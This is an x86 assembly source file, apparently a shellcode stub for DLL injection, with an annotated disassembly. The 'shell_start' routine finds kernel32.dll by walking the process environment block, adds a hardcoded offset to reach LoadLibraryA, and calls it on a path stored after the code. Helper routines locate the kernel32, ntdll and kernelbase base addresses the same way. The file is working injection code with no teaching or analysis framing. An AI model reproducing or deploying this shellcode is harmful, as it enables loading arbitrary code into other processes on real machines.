;===================================================
;Disassembly: https://defuse.ca/online-x86-assembler.htm#disassembly

;0:  60                      pusha
;1:  9c                      pushf
;2:  e8 00 00 00 00          call   7 <start>
;00000007 <start>:
;7:  59                      pop    ecx
;8:  83 e9 07                sub    ecx,0x7
;b:  64 a1 30 00 00 00       mov    eax,fs:0x30
;11: 8b 40 0c                mov    eax,DWORD PTR [eax+0xc]
;14: 8b 70 1c                mov    esi,DWORD PTR [eax+0x1c]
;17: 31 d2                   xor    edx,edx
;00000019 <Module>:
;19: 8b 5e 08                mov    ebx,DWORD PTR [esi+0x8]
;1c: 8b 7e 20                mov    edi,DWORD PTR [esi+0x20]
;1f: 8b 36                   mov    esi,DWORD PTR [esi]
;21: 38 57 18                cmp    BYTE PTR [edi+0x18],dl
;24: 75 f3                   jne    19 <Module>
;26: 81 c3 70 12 02 00       add    ebx,0x21270
;2c: 8d 41 15                lea    eax,[ecx+0x15]
;2f: 50                      push   eax
;30: ff d3                   call   ebx
;32: 9d                      popf
;33: 61                      popa
;34: c3                      ret
;======================================================

.code
shell_start proc

    ;Save registers

	pushad
	pushfd
	call @@start              ;Get the delta offset
    ;-----------
@@start:
    pop ecx
    sub ecx,7
    ;-----------
    assume fs:nothing
    mov eax,dword ptr fs:[30h]
    mov eax,dword ptr[eax+0Ch] ;PEB->Ldr
    mov esi,dword ptr[eax+1Ch] ;PEB->Ldr.InInitOrder
    xor edx,edx
@@Module:
    mov ebx,dword ptr[esi+8]   ;base address
    mov edi,dword ptr[esi+20h] ;unicode str
    
    mov esi,dword ptr[esi]
    cmp byte ptr[edi+12*2],dl  ;kernel32.dll->lens 12
    jne @@Module
    ;----------------------
    add ebx,21270h             ;offset LoadLibraryA
    ;----------------------
	lea eax,dword ptr[ecx+53] ;53 byte is a Code length
	push eax
	;-----------
	call ebx

	;Restore registers

	popfd
	popad

	ret
shell_start endp
;===================================================
;This is used to calculate the size of the shellcode
;===================================================
shell_end proc
    
    xor eax,eax
	ret
shell_end endp
;===================================================
;Example code
;===================================================
get_kernel32base proc

    assume fs:nothing
    mov eax,dword ptr fs:[30h]
    mov eax,dword ptr[eax+0Ch] ;PEB->Ldr
    mov esi,dword ptr[eax+1Ch] ;PEB->Ldr.InInitOrder
    xor edx,edx
@@Module:
    mov eax,dword ptr[esi+8]   ;base address
    mov edi,dword ptr[esi+20h] ;unicode str
    ;----------------------
    mov esi,dword ptr[esi]
    cmp byte ptr[edi+12*2],dl  ;kernel32.dll->lens 12
    jne @@Module
    ;----------------------

	ret
get_kernel32base endp
;===================================================
get_ntdll32base proc

    assume fs:nothing
    mov eax,dword ptr fs:[30h]
    mov eax,dword ptr[eax+0Ch] ;PEB->Ldr
    mov esi,dword ptr[eax+1Ch] ;PEB->Ldr.InInitOrder
    xor edx,edx
@@Module:
    mov eax,dword ptr[esi+8]   ;base address
    mov edi,dword ptr[esi+20h] ;unicode str
    ;----------------------
    mov esi,dword ptr[esi]
    cmp byte ptr[edi+9*2],dl  ;ntdll.dll->lens 9
    jne @@Module
    ;----------------------

	ret
get_ntdll32base endp
;===================================================
get_kernelbase32base proc

    assume fs:nothing
    mov eax,dword ptr fs:[30h]
    mov eax,dword ptr[eax+0Ch] ;PEB->Ldr
    mov esi,dword ptr[eax+1Ch] ;PEB->Ldr.InInitOrder
    xor edx,edx
@@Module:
    mov eax,dword ptr[esi+8]   ;base address
    mov edi,dword ptr[esi+20h] ;unicode str
    ;----------------------
    mov esi,dword ptr[esi]
    cmp byte ptr[edi+14*2],dl  ;kernelbase.dll->lens 14
    jne @@Module
    ;----------------------

	ret
get_kernelbase32base endp
;===================================================